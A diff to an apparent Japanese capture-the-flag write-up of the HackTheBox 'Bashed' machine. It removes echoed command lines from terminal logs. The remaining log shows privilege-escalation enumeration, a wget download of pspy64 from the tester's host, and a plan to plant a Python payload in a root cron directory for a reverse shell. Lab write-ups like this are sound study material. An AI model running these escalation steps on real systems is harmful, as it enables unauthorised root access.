@@ -117,7 +117,6 @@ scriptmanager@bashed:/var/www/html/dev$ export TERM=xterm-256color
 scriptmanager@bashed:/var/www/html/dev$ stty rows 66 columns 236
 
 scriptmanager@bashed:/var/www/html/dev$ ls /root
-ls /root
 ls: cannot open directory '/root': Permission denied
 ```
 
@@ -126,7 +125,6 @@ ls: cannot open directory '/root': Permission denied
 scriptmanager所有のファイルを検索  
 ```sh
 scriptmanager@bashed:/var/www/html/dev$ find / -not -path '/proc/*' -user scriptmanager 2> /dev/null 
-<d / -not -path '/proc/*' -user scriptmanager 2> /dev/null                   
 /scripts
 /scripts/test.py
 /home/scriptmanager
@@ -144,10 +142,8 @@ root権限でtest.pyが実行され、作成されたtest.txtはroot権限にな
 root権限のcronでtest.pyが実行されているかも
 ```sh
 scriptmanager@bashed:/var/www/html/dev$ cd /scripts
-cd /scripts
 
 scriptmanager@bashed:/scripts$ ls -la
-ls -la
 total 16
 drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
 drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
@@ -155,13 +151,11 @@ drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
 -rw-r--r--  1 root          root            12 Apr 22 19:50 test.txt
 
 scriptmanager@bashed:/scripts$ cat test.py
-cat test.py
 f = open("test.txt", "w")
 f.write("testing 123!")
 f.close
 
 scriptmanager@bashed:/scripts$ cat test.txt
-cat test.txt
 testing 123!
 ```
 `pspy`で詳細なプロセスを確認する  
@@ -176,7 +170,6 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 scripts内の全てのpythonをroot権限で実行しているで、pythonのペイロードを配置すればroot権限のリバースシェルをとれるかも
 ```sh
 scriptmanager@bashed:/scripts$ wget http://10.10.14.109/pspy64
-wget http://10.10.14.109/pspy64
 --2025-04-25 07:38:05--  http://10.10.14.109/pspy64
 Connecting to 10.10.14.109:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -188,7 +181,6 @@ pspy64              100%[===================>]   2.96M   451KB/s    in 10s
 2025-04-25 07:38:15 (303 KB/s) - 'pspy64' saved [3104768/3104768]
 
 scriptmanager@bashed:/scripts$ chmod +x pspy64
-chmod +x pspy64
 
 scriptmanager@bashed:/scripts$ ./pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
